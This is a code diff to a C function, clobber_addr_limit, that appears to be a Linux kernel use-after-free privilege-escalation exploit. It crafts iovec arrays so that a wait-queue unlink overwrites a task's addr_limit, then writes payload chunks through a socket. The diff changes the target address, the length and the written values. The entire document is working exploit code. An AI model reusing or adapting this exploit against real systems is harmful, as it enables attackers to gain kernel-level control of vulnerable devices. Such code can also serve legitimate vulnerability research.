@@ -171,6 +171,10 @@ void clobber_addr_limit()
   unsigned long testDatum = 0;
   unsigned long testDatum2 = 0;
   
+  unsigned long address = (unsigned long)&testDatum2;
+  unsigned int length = sizeof(testDatum2);
+  unsigned long src[] = { 0xDEADBEEFDEADBEEF };
+  
   struct iovec iovec_array[IOVEC_ARRAY_SZ];
   memset(iovec_array, 0, sizeof(iovec_array));
   
@@ -180,16 +184,15 @@ void clobber_addr_limit()
     (unsigned long)dummyBuffer, /* iov_base (currently in use) */   // wq->task_list->next
     SECOND_WRITE_CHUNK_IOVEC_ITEMS * 0x10, /* iov_len (currently in use) */  // wq->task_list->prev
     
-    &testDatum2, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
-    8, /* next iov_len (sizeof(addr_limit)) */
+    address,
+    length,
     
-    &testDatum, //&testDatum, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
+    &testDatum, //(unsigned long)current_ptr+0x8, // current_ptr+0x8, // current_ptr + 0x8, /* next iov_base (addr_limit) */
     8, /* next iov_len (sizeof(addr_limit)) */
   };
   
   unsigned long third_write_chunk[] = {
     0xABCDEF0123456789, /* value to write over addr_limit */
-    0xfffffffffffffffe, /* value to write over addr_limit */
   };
   
   int delta = (UAF_SPINLOCK+sizeof(second_write_chunk)) % PAGE;
@@ -204,6 +207,8 @@ void clobber_addr_limit()
   iovec_array[IOVEC_INDX_FOR_WQ+1].iov_len = sizeof(second_write_chunk); // wq->task_list->prev: will turn to address of task_list
   iovec_array[IOVEC_INDX_FOR_WQ+2].iov_base = dummyBuffer; // stuff from this point will be overwritten and/or ignored
   iovec_array[IOVEC_INDX_FOR_WQ+2].iov_len = UAF_SPINLOCK;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_base = dummyBuffer;
+  iovec_array[IOVEC_INDX_FOR_WQ+3].iov_len = length;
   iovec_array[IOVEC_INDX_FOR_WQ+4].iov_base = dummyBuffer;
   iovec_array[IOVEC_INDX_FOR_WQ+4].iov_len = sizeof(third_write_chunk);
   int totalLength = iovec_size(iovec_array, IOVEC_ARRAY_SZ);
@@ -227,10 +232,15 @@ void clobber_addr_limit()
     char* f = malloc(totalLength); 
     if (f == NULL) err(1,"Allocating memory");
     memset(f,'-',paddingSize+UAF_SPINLOCK);
-    memcpy(f+paddingSize+UAF_SPINLOCK,second_write_chunk,sizeof(second_write_chunk));
-    memcpy(f+paddingSize+UAF_SPINLOCK+sizeof(second_write_chunk),third_write_chunk,sizeof(third_write_chunk));
-    write(socks[1], f, paddingSize+UAF_SPINLOCK+sizeof(second_write_chunk)+sizeof(third_write_chunk));
-    printf("CHILD: wrote %lu\n", paddingSize+UAF_SPINLOCK+sizeof(second_write_chunk)+sizeof(third_write_chunk));
+    unsigned long pos = paddingSize+UAF_SPINLOCK;
+    memcpy(f+pos,second_write_chunk,sizeof(second_write_chunk));
+    pos += sizeof(second_write_chunk);
+    memcpy(f+pos,src,length);
+    pos += length;
+    memcpy(f+pos,third_write_chunk,sizeof(third_write_chunk));
+    pos += sizeof(third_write_chunk);
+    write(socks[1], f, pos);
+    printf("CHILD: wrote %lu\n", pos);
     close(socks[1]);
     close(socks[0]);
     exit(0);
